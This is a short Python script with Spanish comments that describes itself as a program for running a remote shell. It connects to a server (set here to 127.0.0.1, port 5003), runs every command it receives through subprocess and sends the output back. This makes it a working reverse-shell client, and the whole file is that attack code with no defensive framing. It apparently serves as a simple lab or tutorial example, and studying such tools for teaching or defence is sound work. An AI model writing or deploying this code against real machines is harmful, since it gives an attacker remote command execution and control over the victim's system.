'''
    El siguiente programa funciona para ejecutar una shell remota.
'''

#Librerías necesarias.
import socket
import subprocess

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5003
BUFFER_SIZE = 1024

#Se crea un objeto socket.
skt = socket.socket()

#Conexión con el servidor.
skt.connect((SERVER_HOST, SERVER_PORT))

#Se recibe el mensaje de saludo.
message = skt.recv(BUFFER_SIZE).decode()
print('Server: ', message)

while True: #Bucle infinito.
    #Se recibe el comando desde el servidor.
    command = skt.recv(BUFFER_SIZE).decode()

    if command.lower() == 'exit': #Sale del bucle.
        break
    
    #Ejecuta el comando recibido.
    output = subprocess.getoutput(command)

    #Envía los resultados el servidor.
    skt.send(output.encode())

#Se cierra el socket.
skt.close()